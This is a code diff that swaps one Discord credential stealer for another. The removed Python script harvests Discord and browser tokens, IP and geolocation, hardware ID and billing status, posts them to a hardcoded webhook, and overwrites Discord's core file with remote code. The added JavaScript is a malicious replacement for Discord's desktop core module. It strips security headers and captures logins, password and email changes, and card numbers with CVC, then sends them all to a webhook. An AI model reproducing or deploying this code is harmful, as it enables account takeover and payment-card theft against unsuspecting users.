@@ -1,253 +1,365 @@
-import os
-if os.name != "nt":
-	exit()
-from re import findall
-import json
-import psutil
-import platform as plt
-from json import loads, dumps
-from base64 import b64decode
-from subprocess import Popen, PIPE
-from urllib.request import Request, urlopen
-from datetime import datetime
+const fs = require('fs');
+const path = require('path');
+const { BrowserWindow, session } = require('electron')
+const querystring = require('querystring');
+var webhook = "%WEBHOOK_LINK%";
 
-webhook_url = "https://discord.com/api/webhooks/909805777420685313/lsNXrsLv5HWhNNOOS0zk_8Safh78vweP-WPwf0Z4uzlp1YEEfmfu5Dso1WNOOrYsOiAF"
-password_stealer = True
+function FirstTime() {
+    if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
+        return !0
+    }
+    fs.rmdirSync(path.join(__dirname, "Hazard"));
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
+    return !1
+}
+const Filter = {
+    "urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
+}
+session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
+    if (FirstTime())
+        if (details.url.startsWith("wss://")) {
+            callback({
+                cancel: !0
+            })
+        } else {
+            callback({
+                cancel: !1
+            })
+        }
+})
+session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
+    if (details.url.startsWith(webhook.split('/')[2])) {
+        callback({
+            responseHeaders: {
+                ...details.responseHeaders,
+                'Access-Control-Allow-Origin': "*",
+                "Access-Control-Allow-Headers": "*"
+            }
+        })
+    } else {
+        delete details.responseHeaders['content-security-policy'];
+        delete details.responseHeaders['content-security-policy-report-only'];
+        callback({
+            responseHeaders: {
+                ...details.responseHeaders,
+                'Access-Control-Allow-Headers': "*"
+            }
+        })
+    }
+})
 
-languages = {
-	'da'    : 'Danish, Denmark',
-	'de'    : 'German, Germany',
-	'en-GB' : 'English, United Kingdom',
-	'en-US' : 'English, United States',
-	'es-ES' : 'Spanish, Spain',
-	'fr'    : 'French, France',
-	'hr'    : 'Croatian, Croatia',
-	'lt'    : 'Lithuanian, Lithuania',
-	'hu'    : 'Hungarian, Hungary',
-	'nl'    : 'Dutch, Netherlands',
-	'no'    : 'Norwegian, Norway',
-	'pl'    : 'Polish, Poland',
-	'pt-BR' : 'Portuguese, Brazilian, Brazil',
-	'ro'    : 'Romanian, Romania',
-	'fi'    : 'Finnish, Finland',
-	'sv-SE' : 'Swedish, Sweden',
-	'vi'    : 'Vietnamese, Vietnam',
-	'tr'    : 'Turkish, Turkey',
-	'cs'    : 'Czech, Czechia, Czech Republic',
-	'el'    : 'Greek, Greece',
-	'bg'    : 'Bulgarian, Bulgaria',
-	'ru'    : 'Russian, Russia',
-	'uk'    : 'Ukranian, Ukraine',
-	'th'    : 'Thai, Thailand',
-	'zh-CN' : 'Chinese, China',
-	'ja'    : 'Japanese',
-	'zh-TW' : 'Chinese, Taiwan',
-	'ko'    : 'Korean, Korea'
+function SendToWebhook(what) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${webhook}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, !0).then((token => {}))
 }
 
-LOCAL = os.getenv("LOCALAPPDATA")
-ROAMING = os.getenv("APPDATA")
-PATHS = {
-	"Discord"           : ROAMING + "\\Discord",
-	"Discord Canary"    : ROAMING + "\\discordcanary",
-	"Discord PTB"       : ROAMING + "\\discordptb",
-	"Google Chrome"     : LOCAL + r"\\Google\\Chrome\\User Data\\Default",
-	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
-	"Opera GX"			: ROAMING + "\\Opera Software\\Opera GX Stable",
-	"Brave"             : LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-	"Yandex"            : LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
+  function GetBadges(flags)
+  {
+  const Discord_Employee = 1;
+  const Partnered_Server_Owner = 2;
+  const HypeSquad_Events = 4;
+  const Bug_Hunter_Level_1 = 8;
+  const House_Bravery = 64;
+  const House_Brilliance = 128;
+  const House_Balance = 256;
+  const Early_Supporter = 512;
+  const Bug_Hunter_Level_2 = 16384;
+  const Early_Verified_Bot_Developer = 131072;
+  
+  var badges = "";
+  
+  if((flags & Discord_Employee) == Discord_Employee){
+     badges += "Staff,";
+  }
+  if((flags & Partnered_Server_Owner) == Partnered_Server_Owner){
+     badges += "Partner,";
+  }
+  if((flags & HypeSquad_Events) == HypeSquad_Events){
+     badges += "Hypesquad Event,"
+  }
+  if((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1){
+     badges += "Green Bughunter,";
+  }
+  if((flags & House_Bravery) == House_Bravery) {
+     badges += "Hypesquad Bravery,";
+  }
+  if((flags & House_Brilliance) == House_Brilliance){
+     badges += "HypeSquad Brillance,";
+  }
+  if((flags & House_Balance) == House_Balance){
+     badges += "HypeSquad Balance,";
+  }
+  if((flags & Early_Supporter) == Early_Supporter){
+     badges += "Early Supporter,";
+  }
+  if((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2){
+     badges += "Gold BugHunter,";
+  }
+  if((flags &Early_Verified_Bot_Developer ) == Early_Verified_Bot_Developer ){
+     badges += "Discord Developer,";
+  }
+  if (badges == "" ){
+      badges = "None"
+  }
+  return badges;
+  
+  }
+
+function Login(email, password, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, !0).then((ip) => {
+            const json = JSON.parse(info);
+            var params = {
+                username: "Grabber",
+                content: "",
+                avatar_url: "https://cdn.discordapp.com/attachments/858564728224612402/909848187517403176/Jegyzet_2020-08-09_222247.png",
+                embeds: [
+                    {
+                        "color": 16507654,
+                        "fields": [
+                            {
+                                "name": "**Account Info**",
+                                "value": `Email: ${email} - Password: ${password}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Token**",
+                                "value": `\`${token}\``,
+                                "inline": false
+                            }
+                        ],
+                        "author": {
+                            "name": json.username +"#" + json.discriminator + "・" + json.id,
+                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        },
+                        "footer": {
+                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        }
+                    }
+                ]
+            }
+            SendToWebhook(JSON.stringify(params))
+        })
+    })
 }
-def getheaders(token=None, content_type="application/json"):
-	headers = {
-		"Content-Type": content_type,
-		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-	}
-	if token:
-		headers.update({"Authorization": token})
-	return headers
 
-def getuserdata(token):
-	try:
-		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
-	except:
-		pass
-		
-def gettokens(path):
-	path += "\\Local Storage\\leveldb"
-	tokens = []
-	for file_name in os.listdir(path):
-		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
-			continue
-		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-				for token in findall(regex, line):
-					tokens.append(token)
-	return tokens
+function ChangePassword(oldpassword, newpassword, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, !0).then((ip) => {
+            const json = JSON.parse(info);
+            var params = {
+                username: "Grabber",
+                content: "",
+                avatar_url: "https://cdn.discordapp.com/attachments/858564728224612402/909848187517403176/Jegyzet_2020-08-09_222247.png",
+                embeds: [
+                    {
+                        "color": 16507654,
+                        "fields": [
+                            {
+                                "name": "**Password Changed**",
+                                "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Other Info**",
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Token**",
+                                "value": `\`${token}\``,
+                                "inline": false
+                            }
+                        ],
+                        "author": {
+                            "name": json.username +"#" + json.discriminator + "・" + json.id,
+                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        },
+                        "footer": {
+                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        }                 
+                    }
+                ]
+            }
+        SendToWebhook(JSON.stringify(params))
+        })
+    })
+}
 
-def gethwid():
-    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+function ChangeEmail(newemail, password, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, !0).then((ip) => {
+            var params = {
+                username: "Grabber",
+                content: "",
+                avatar_url: "https://cdn.discordapp.com/attachments/858564728224612402/909848187517403176/Jegyzet_2020-08-09_222247.png",
+                embeds: [
+                    {
+                        "color": 16507654,
+                        "fields": [
+                            {
+                                "name": "**Email Changed**",
+                                "value": `New Email: ${newemail}\nPassword: ${password}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Other Info**",
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Token**",
+                                "value": `\`${token}\``,
+                                "inline": false
+                            }
+                        ],
+                        "author": {
+                            "name": json.username +"#" + json.discriminator + "・" + json.id,
+                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        },
+                        "footer": {
+                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        }                
+                    }
+                ]
+            }
+            SendToWebhook(JSON.stringify(params))
+        })
+    })
+}
 
-def getip():
-	ip = org = loc = city = country = region = googlemap = "None"
-	try:
-		url = 'http://ipinfo.io/json'
-		response = urlopen(url)
-		data = json.load(response)
-		ip = data['ip']
-		org = data['org']
-		loc = data['loc']
-		city = data['city']
-		country = data['country']
-		region = data['region']
-		googlemap = "https://www.google.com/maps/search/google+map++" + loc
-	except:
-		pass
-	return ip,org,loc,city,country,region,googlemap
-
-def getavatar(uid, aid):
-	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
-	try:
-		urlopen(Request(url))
-	except:
-		url = url[:-4]
-	return url
-
-def has_payment_methods(token):
-	try:
-		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
-	except:
-		pass
-
-def main():
-	embeds = []
-	working = []
-	checked = []
-	working_ids = []
-	computer_os = plt.platform()
-	ip,org,loc,city,country,region,googlemap = getip()
-	pc_username = os.getenv("UserName")
-	pc_name = os.getenv("COMPUTERNAME")
-	for platform, path in PATHS.items():
-		if not os.path.exists(path):
-			continue
-		for token in gettokens(path):
-			if token in checked:
-				continue
-			checked.append(token)
-			uid = None
-			if not token.startswith("mfa."):
-				try:
-					uid = b64decode(token.split(".")[0].encode()).decode()
-				except:
-					pass
-				if not uid or uid in working_ids:
-					continue
-			user_data = getuserdata(token)
-			if not user_data:
-				continue
-			working_ids.append(uid)
-			working.append(token)
-			username = user_data["username"] + "#" + str(user_data["discriminator"])
-			user_id = user_data["id"]
-			locale = user_data['locale']
-			avatar_id = user_data["avatar"]
-			avatar_url = getavatar(user_id, avatar_id)
-			email = user_data.get("email")
-			phone = user_data.get("phone")
-			verified = user_data['verified']
-			mfa_enabled = user_data['mfa_enabled']
-			flags = user_data['flags']
-			creation_date = datetime.fromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime("%d-%m-%Y %H:%M:%S")
-
-			language = languages.get(locale)
-			nitro = bool(user_data.get("premium_type"))
-			billing = bool(has_payment_methods(token))
-			embed = {
-				"color": 16507654,
-				"fields": [
-					{
-						"name": "**𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗜𝗻𝗳𝗼**",
-						"value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
-						"inline": True
-					},
-					{
-						"name": "**𝗣𝗰 𝗜𝗻𝗳𝗼**",
-						"value": f'OS: {computer_os}\nUsername: {pc_username}\nPc Name: {pc_name}\nHwid:\n{gethwid()}',
-						"inline": True
-					},
-					{
-						"name": "--------------------------------------------------------------------------------------------------",
-						"value":"-----------------------------------------------------------------------------------------------",
-						"inline": False
-					},
-					{
-						"name": "**𝗜𝗣**",
-						"value": f'IP: {ip}\nMap location: [{loc}]({googlemap})\nCity: {city}\nRegion: {region}\nOrg: {org}',
-						"inline": True
-					},
-					{
-						"name": "**𝗢𝘁𝗵𝗲𝗿 𝗜𝗻𝗳𝗼**",
-						"value": f'Locale: {locale} ({language})\nToken Location: {platform}\nEmail Verified: {verified}\n2fa Enabled: {mfa_enabled}\nCreation Date: {creation_date}',
-						"inline": True
-					},
-					{
-						"name": "**𝗧𝗼𝗸𝗲𝗻**",
-						"value": f"`{token}`",
-						"inline": False
-					}
-				],
-				"author": {
-					"name": f"{username}・{user_id}",
-					"icon_url": avatar_url
-				},
-				"footer": {
-					"text": "Token Grabber by: ojeje, ojeje#4179"
-				}
-			}
-			embeds.append(embed)
-
-	if len(working) == 0:
-		working.append('123')
-	webhook = {
-		"content": "",
-		"embeds": embeds,
-		"username": "ojeje Token Grabber",
-		"avatar_url": "https://cdn.discordapp.com/attachments/858564728224612402/909848187517403176/Jegyzet_2020-08-09_222247.png"
-	}
-	try:
-		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
-	except:
-		pass
-
-def HazardStealer():
-	for proc in psutil.process_iter():
-		if any(procstr in proc.name() for procstr in\
-		['discord', 'Discord', 'DISCORD',]):
-			proc.kill()
-	for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
-		for name in dirs:
-			if (name.__contains__("discord_desktop_core-")):
-				try:
-					directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
-					os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
-					f = urlopen("https://raw.githubusercontent.com/ojejexd/ojejexd/main/something")
-					index_content = f.read()
-					with open(directory_list, 'wb') as index_file:
-						index_file.write(index_content)
-					with open(directory_list, 'r+') as index_file2:
-						replace_string = index_file2.read().replace("%WEBHOOK_LINK%", webhook_url)
-					with open(directory_list, 'w'): pass
-					with open(directory_list, 'r+') as index_file3:
-						index_file3.write(replace_string)
-				except Exception:
-				    pass
-	for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
-		for name in files:
-			discord_file = os.path.join(root, name)
-			os.startfile(discord_file)
-
-if __name__ == "__main__":
-    main()
-    if password_stealer:
-        HazardStealer()
+function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, !0).then((ip) => {
+            var json = JSON.parse(info);
+            var params = {
+                username: "Grabber",
+                content: "",
+                avatar_url: "https://cdn.discordapp.com/attachments/858564728224612402/909848187517403176/Jegyzet_2020-08-09_222247.png",
+                embeds: [
+                    {
+                        "color": 16507654,
+                        "fields": [
+                            {
+                                "name": "**Credit Card Added**",
+                                "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Other Info**",
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                                "inline": true
+                            },
+                            {
+                                "name": "**Token**",
+                                "value": `\`${token}\``,
+                                "inline": false
+                            }
+                        ],
+                        "author": {
+                            "name": json.username + "#" + json.discriminator + "・" + json.id,
+                            "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        },
+                        "footer": {
+                            "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        }
+                    }
+                ]
+            }
+            SendToWebhook(JSON.stringify(params))
+        })
+    })
+}
+const ChangePasswordFilter = {
+    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
+};
+session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
+    if (details.url.endsWith("login")) {
+        if (details.statusCode == 200) {
+            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+            const email = data.login;
+            const password = data.password;
+            const window = BrowserWindow.getAllWindows()[0];
+            window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+                Login(email, password, token)
+            }))
+        } else {}
+    }
+    if (details.url.endsWith("users/@me")) {
+        if (details.statusCode == 200 && details.method == "PATCH") {
+            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+            if (data.password != null && data.password != undefined && data.password != "") {
+                if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
+                    const window = BrowserWindow.getAllWindows()[0];
+                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+                        ChangePassword(data.password, data.new_password, token)
+                    }))
+                }
+                if (data.email != null && data.email != undefined && data.email != "") {
+                    const window = BrowserWindow.getAllWindows()[0];
+                    window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+                        ChangeEmail(data.email, data.password, token)
+                    }))
+                }
+            }
+        } else {}
+    }
+    if (details.url.endsWith("tokens")) {
+        const window = BrowserWindow.getAllWindows()[0];
+        const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
+        window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token)
+        }))
+    }
+});
+module.exports = require('./core.asar')
